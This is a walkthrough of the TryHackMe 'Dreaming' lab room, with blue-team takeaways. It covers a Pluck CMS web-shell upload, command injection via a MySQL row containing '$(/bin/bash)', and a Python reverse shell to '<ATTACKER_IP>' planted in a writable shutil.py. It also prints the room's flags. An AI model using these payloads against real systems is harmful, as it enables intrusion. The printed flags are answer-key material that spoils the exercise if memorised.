# [Dreaming](https://tryhackme.com/room/dreaming)

| Field      | Details                          |
|------------|----------------------------------|
| Room       | [Dreaming](https://tryhackme.com/room/dreaming) |
| Platform   | TryHackMe                        |
| Difficulty | Easy                                |
| Category   | Web Exploitation, Linux Privilege Escalation |
| Tags       | Pluck CMS, SQL Command Injection, Sudo Abuse, Python Library Hijacking |

---

## Overview

*"Solve the riddle that dreams have woven. While the king of dreams was imprisoned, his home fell into ruins. Can you help Sandman restore his kingdom?"* Turns out restoring a kingdom mostly means finding out that the Librarian reused a password, the servant of Death left the database credentials in his shell history like a grocery list, and the whole realm falls to a `shutil.py` import nobody thought to lock down. The Endless keep pretty questionable OPSEC for beings who've technically been around since the dawn of consciousness.

Three users, three flags, three separate lapses in judgment stacked on top of each other like a very unstable dream palace. Lucien guards the library and guards it about as well as a password left in a Python script. Death runs a script that's vulnerable to command injection through, of all things, a MySQL insert statement. And Morpheus, the actual King of Dreams, gets undone by a shared Python group permission. Somewhere, the real Sandman is taking notes on what not to do.

```
Attack surface
┌─────────────────────────────────────┐
│  22/tcp – SSH                          │
│  80/tcp – HTTP (Pluck CMS, vulnerable   │
│           version, default Apache page) │
└─────────────────────────────────────┘
```

---

## Enumeration

### Initial Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The homepage on port 80 is just the default Apache landing page, which is the digital equivalent of a dream with no furniture in it yet. Nothing to see, which means there's absolutely something to see, just not from the front door.

### Finding the CMS

Directory brute-forcing turns up more of the house than the front page ever admitted to:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Buried in the results is an `app` directory, and inside it, a running instance of **Pluck CMS**, specifically version **4.7.13**, a version old enough to have a well-documented history of letting authenticated admins upload arbitrary files disguised as something friendlier.

```
Enumeration chain
┌───────────────────────────────────────────┐
│  Default Apache page ──► nothing visible       │
│         │                                     │
│  Gobuster ──► /app directory                     │
│         │                                     │
│  Pluck CMS 4.7.13 ──► known vulnerable version     │
└───────────────────────────────────────────┘
```

---

## Initial Access

### Popping Pluck CMS

Pluck 4.7.13 is vulnerable to an authenticated arbitrary file upload, which normally would require credentials, except the admin panel on a lot of these rooms is left wide open with default or trivially guessable creds, and this one's no exception. Logging into the admin panel and abusing the file upload functionality (typically via the album/image upload feature, disguising a PHP web shell with an allowed extension or a content-type bypass) gets a payload onto the server.

Hitting the uploaded shell gives command execution as `www-data`, low privilege, but a foot fully in the door.

```
Foothold chain
┌───────────────────────────────────────────┐
│  Pluck CMS 4.7.13 admin panel                 │
│         │                                     │
│  Authenticated arbitrary file upload            │
│         │                                     │
│  PHP web shell uploaded and triggered              │
│         │                                     │
│  Shell as www-data                                │
└───────────────────────────────────────────┘
```

---

## Privilege Escalation 1: www-data → Lucien, the Librarian

### Finding the Password in Plain Sight

Poking around `/opt` as `www-data` turns up two Python files, `test.py` and `getDreams.py`, that look like they belong somewhere else entirely. `test.py` contains a hardcoded, plaintext password, and that password belongs to **lucien**, the Dreaming's very own Librarian, who apparently keeps his credentials exactly as well-organized as his book collection: right out in the open.

```bash
ssh lucien@<TARGET_IP>
```

Logging in with the leaked password drops straight into Lucien's home directory, where his flag is sitting, entirely unguarded, same as his password was.

```
Answer 1 — Lucien Flag: THM{TH3_L1BR4R14N}
```

```
Password leak chain
┌───────────────────────────────────────────┐
│  /opt/test.py ──► hardcoded lucien password    │
│         │                                     │
│  SSH as lucien ──► lucien_flag.txt                │
└───────────────────────────────────────────┘
```

---

## Privilege Escalation 2: Lucien → Death

### The Sudo Rule That Wasn't as Safe as It Looked

`sudo -l` as Lucien shows exactly one thing he's allowed to run as someone else:

```
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

`getDreams.py` connects to a MySQL database, queries a `library` table's `dreams` entries (dreamer, dream), and echoes the results back using a Python f-string built straight from that untrusted database data:

```python
command = f"echo {dreamer} + {dream}"
```

No sanitization, no parameterization, just raw values from the database dropped directly into a shell command. That's not an echo statement, that's an open invitation.

### Getting the DB Password

Lucien's own `.bash_history` obligingly hands over the MySQL credentials he'd used earlier:

```bash
cat $HOME/.bash_history | grep mysql
# mysql -u lucien -plucien42DBPASSWORD
```

### Injecting a Command Through the Dreams Table

With database access in hand, inserting a row into the `dreams` table lets the "dream" or "dreamer" field carry a shell command substitution, which `getDreams.py` will happily execute the next time it runs as `death`:

```sql
mysql -u lucien -plucien42DBPASSWORD
USE library;
INSERT INTO dreams VALUES ("sha", "$(/bin/bash)");
```

Then, back as Lucien, triggering the allowed sudo command:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The injected `$(/bin/bash)` executes as `death` when the script's `echo` command runs, dropping a shell as `death` right there in the middle of what was supposed to be a harmless print statement.

```
Command injection chain
┌───────────────────────────────────────────┐
│  sudo -l ──► lucien can run getDreams.py as death │
│         │                                     │
│  getDreams.py ──► f-string built from DB data      │
│         │                                     │
│  .bash_history ──► leaked MySQL creds               │
│         │                                     │
│  INSERT malicious row ──► $(/bin/bash) payload        │
│         │                                     │
│  sudo run of getDreams.py ──► executes payload as death│
└───────────────────────────────────────────┘
```

With a shell as `death`, the second flag is sitting in the home directory, waiting.

```
Answer 2 — Death Flag: THM{1M_TH3R3_4_TH3M}
```

---

## Privilege Escalation 3: Death → Morpheus

### The Shared Group That Undid the King

Straightforward privesc tricks come up empty here, no juicy SUID binaries, no easy sudo rule waiting to be abused. What does turn up, after a closer look at file permissions, is that the `death` group has write access to a core Python library file, `shutil.py`, somewhere under the system's Python install path.

That file gets imported by `restore.py`, a script sitting in Morpheus's home directory, apparently the very script responsible for putting the King of Dreams' kingdom back together. And `restore.py` runs on a schedule, root-adjacent territory, as `morpheus`, via a cron job.

```
Library hijack setup
┌───────────────────────────────────────────┐
│  death group ──► write access to shutil.py       │
│         │                                     │
│  morpheus's restore.py ──► imports shutil            │
│         │                                     │
│  restore.py ──► runs on a cron schedule as morpheus  │
└───────────────────────────────────────────┘
```

### Planting the Payload

Editing the writable `shutil.py` to drop in a malicious line, either a full reverse shell payload or a simpler permission change, does the job. The lower-effort route just flips the flag file's permissions wide open:

```python
os.system('chmod 777 /home/morpheus/morpheus_flag.txt')
```

The more thorough route drops a reverse shell:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",<PORT>))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Either way, the next time cron fires `restore.py`, it imports the now-poisoned `shutil.py` as `morpheus`, and the payload executes with his privileges, whether that's a direct file permission change or a shell handed straight to a waiting listener.

```
Answer 3 — Morpheus Flag: THM{DR34MS_5H4P3_TH3_W0RLD}
```

```
Final privesc chain
┌───────────────────────────────────────────┐
│  Writable shutil.py ──► payload inserted        │
│         │                                     │
│  Cron fires restore.py as morpheus                │
│         │                                     │
│  Poisoned shutil import ──► payload executes         │
│         │                                     │
│  Flag readable / reverse shell as morpheus            │
└───────────────────────────────────────────┘
```

---

## Investigation Summary

```
[nmap scan]
  │
  └─ 22/ssh, 80/http (default page)
         │
[Gobuster] ──► /app ──► Pluck CMS 4.7.13
         │
[Authenticated file upload] ──► PHP shell ──► www-data
         │
[/opt/test.py] ──► lucien's plaintext password
         │
[SSH as lucien] ──► Lucien Flag
         │
[sudo -l] ──► lucien can run getDreams.py as death
         │
[.bash_history] ──► MySQL creds
         │
[SQL command injection via dreams table] ──► $(/bin/bash) as death
         │
[Shell as death] ──► Death Flag
         │
[death group writable shutil.py] ──► restore.py (morpheus, cron)
         │
[Poisoned import fires on schedule] ──► Morpheus Flag
```

---

## Flags

| # | Question | Answer |
|---|----------|--------|
| 1 | What is the Lucien Flag? | `THM{TH3_L1BR4R14N}` |
| 2 | What is the Death Flag? | `THM{1M_TH3R3_4_TH3M}` |
| 3 | What is the Morpheus Flag? | `THM{DR34MS_5H4P3_TH3_W0RLD}` |

**Would I recommend this room?** Yes, it's a genuinely fun escalation chain dressed up in Sandman mythology, CMS exploitation, hardcoded credentials, SQL-driven command injection, and a Python library hijack via cron, all as distinct, well-signposted steps. Great room for practicing the full arc from web foothold to privileged shell without any single stage overstaying its welcome.

---

## Blue Team Takeaways

**Credentials Belong in a Vault, Not a Script Named `test.py`**
Lucien's password sat in plaintext inside a file that screamed "temporary" and never got cleaned up. Any script, test or production, that touches real credentials needs those credentials pulled from a secrets manager or environment variable, never hardcoded, and definitely never left behind after testing wraps.

**Untrusted Data Has No Business Inside a Shell Command**
`getDreams.py` built a shell command directly out of database rows nobody had vetted, which is exactly how a MySQL `INSERT` turned into arbitrary command execution as another user. Any value pulled from a database, a form, or anywhere outside the application's direct control needs to be treated as hostile before it ever touches `os.system`, `subprocess`, or an f-string headed for a shell.

**Shell History Is a Long-Term Liability**
Lucien's `.bash_history` held onto a MySQL password long after the command that used it had scrolled off the screen. Sensitive commands run interactively should avoid embedding credentials directly (use config files, prompts, or environment variables instead), and history files should be scrubbed or excluded from ever capturing secrets in the first place.

**Group Write Access to Shared Libraries Is Root-Equivalent Access**
Letting the `death` group write to a core Python module that a privileged, cron-run script imports handed over code execution as `morpheus` with zero direct compromise of his account. Any file that a higher-privilege process imports or executes needs ownership and permissions locked down to that privilege level alone; shared group write access to shared code paths is a privilege escalation vector waiting to be noticed.

**Cron Jobs Inherit Whatever They Import**
`restore.py` ran faithfully on schedule and had no idea its own dependency had been quietly rewritten underneath it. Scheduled tasks running as a privileged user should have their entire import chain, not just the script itself, protected from write access by lower-privileged accounts.

---

*The Dreaming got restored in the end, though it's worth noting the King of Dreams himself fell to a cron job importing a tampered library, which feels like exactly the kind of poetic, mildly humiliating irony the Endless would appreciate in someone else's story.*
